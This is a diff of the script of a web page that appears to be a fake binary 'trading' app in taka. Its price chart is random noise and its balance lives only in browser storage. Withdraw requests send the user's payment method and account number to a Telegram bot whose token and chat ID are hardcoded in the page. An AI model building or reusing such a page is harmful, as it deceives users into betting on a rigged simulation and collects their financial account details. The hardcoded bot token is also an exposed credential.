@@ -115,6 +115,7 @@ button{flex:1;padding:12px;border-radius:10px;border:0;font-weight:800;cursor:po
 </div>
 
 <script>
+// ===== Local Storage & Trading Logic =====
 const LOCAL_BAL='trade_balance';
 const LOCAL_LOG='trade_log';
 const LOCAL_CLAIMED='trade_claimed_codes';
@@ -150,7 +151,7 @@ function renderLogs(){
   for(let i=tradesLog.length-1;i>=0;i--){
     const t=tradesLog[i];
     const div=document.createElement('div');
-    div.className='trade '+(t.result || '');
+    div.className='trade '+(t.result||'');
     let countdownText = t.remaining!==undefined ? ` (${t.remaining}s left)` : '';
     div.innerHTML=`<div>${t.side} ৳${t.stake}${countdownText}<div class="small">Start:৳${t.start.toFixed(2)} End:৳${t.end?.toFixed(2)||'—'}</div></div>
     <div style="text-align:right">${t.result==='win'?'+৳'+t.profit.toFixed(2):(t.result==='lose'?'-৳'+t.stake.toFixed(2):'-')}</div>`;
@@ -166,6 +167,7 @@ function updateUI(){
   btns.forEach(b=>b.disabled=balance<=0);
 }
 
+// ===== Place Trade =====
 function placeTrade(side){
   if(balance<=0){alert('Balance is 0. Please claim first.');return;}
   const stake=Number(stakeEl.value)||1;
@@ -214,7 +216,7 @@ function resolveTrade(pos){
 document.getElementById('btn-up').onclick=()=>placeTrade('UP');
 document.getElementById('btn-down').onclick=()=>placeTrade('DOWN');
 
-// Claim Logic
+// ===== Claim Bonus =====
 claimBtn.onclick=()=>{
   const code=claimInput.value.trim();
   if(!code){claimMsg.textContent='Enter a code.';claimMsg.style.color='#f87171';return;}
@@ -230,7 +232,7 @@ claimBtn.onclick=()=>{
   }
 };
 
-// Withdraw
+// ===== Withdraw =====
 const withdrawToggle=document.getElementById('withdraw-toggle');
 const withdrawForm=document.getElementById('withdraw-form');
 const withdrawSubmit=document.getElementById('withdraw-submit');
@@ -246,7 +248,6 @@ withdrawSubmit.onclick=()=>{
   if(amount>balance){withdrawMsg.textContent='Not enough balance';withdrawMsg.style.color='#f87171';return;}
   if(!account){withdrawMsg.textContent='Enter account number';withdrawMsg.style.color='#f87171';return;}
   
-  // Telegram Bot Request
   const botToken='8208123231:AAGfYNQzyKm6w6J0Je7fk7Pt0sDhTf8Ek-U';
   const chatId='6593402184';
   const text=`Withdraw Request\nMethod: ${method}\nAmount: ৳${amount}\nAccount: ${account}`;
@@ -265,41 +266,49 @@ withdrawSubmit.onclick=()=>{
   });
 };
 
-// Price Chart + Trend
+// ===== Price Chart + UP/DOWN Candle =====
 const canvas=document.getElementById('chart');
 const ctx=canvas.getContext('2d');let DPR=window.devicePixelRatio||1;
 function resize(){canvas.width=canvas.clientWidth*DPR;canvas.height=canvas.clientHeight*DPR;ctx.setTransform(DPR,0,0,DPR,0,0);}
 window.onresize=resize;resize();
-let price=1000;let prices=[{x:0,y:price}];let t=0;
-let priceDirection=1;
+
+let price=1000;
+let prices=[{x:0,y:price}];
+let t=0;
+
 function step(){
-  const old=price;
-  price += (Math.random()*2)*priceDirection;
-  if(price>old+3 || price<old-3) priceDirection*=-1;
+  const old = price;
+  price += (Math.random()*3 + 1) * (Math.random()<0.5 ? -1 : 1); // UP/DOWN
+
   if(price<1) price=1;
   prices.push({x:t++,y:price});
-  if(prices.length>200)prices.shift();
-  if(price>old)trendEl.textContent='UP ▲',trendEl.style.color='#16a34a';
-  else if(price<old)trendEl.textContent='DOWN ▼',trendEl.style.color='#ef4444';
-  else trendEl.textContent='—',trendEl.style.color='#98a6b8';
+  if(prices.length>200) prices.shift();
+
+  if(price>old) trendEl.textContent='UP ▲', trendEl.style.color='#16a34a';
+  else if(price<old) trendEl.textContent='DOWN ▼', trendEl.style.color='#ef4444';
+  else trendEl.textContent='—', trendEl.style.color='#98a6b8';
 }
+
 function draw(){
   const W=canvas.clientWidth,H=canvas.clientHeight;
   ctx.clearRect(0,0,W,H);
-  const minY=Math.min(...prices.map(p=>p.y)),maxY=Math.max(...prices.map(p=>p.y));
+  const minY=Math.min(...prices.map(p=>p.y)), maxY=Math.max(...prices.map(p=>p.y));
   ctx.beginPath();
   prices.forEach((p,i)=>{
-    const x=i/(prices.length-1)*W;const y=H-(p.y-minY)/(maxY-minY)*H;
-    if(i==0)ctx.moveTo(x,y);else ctx.lineTo(x,y);
+    const x=i/(prices.length-1)*W;
+    const y=H-(p.y-minY)/(maxY-minY)*H;
+    if(i==0) ctx.moveTo(x,y); else ctx.lineTo(x,y);
   });
-  ctx.strokeStyle='#06b6d4';ctx.lineWidth=2;ctx.stroke();
+  ctx.strokeStyle='#06b6d4'; ctx.lineWidth=2; ctx.stroke();
+
   priceEl.textContent='৳'+price.toFixed(2);
   if(prices.length>2){
     const change=((prices.at(-1).y-prices[0].y)/prices[0].y*100).toFixed(2);
     changeEl.textContent=(change>=0?'+':'')+change+'%';
   }
 }
-setInterval(()=>{step();draw();},500);
+
+setInterval(()=>{step(); draw();},500);
 
 updateUI();
 </script>
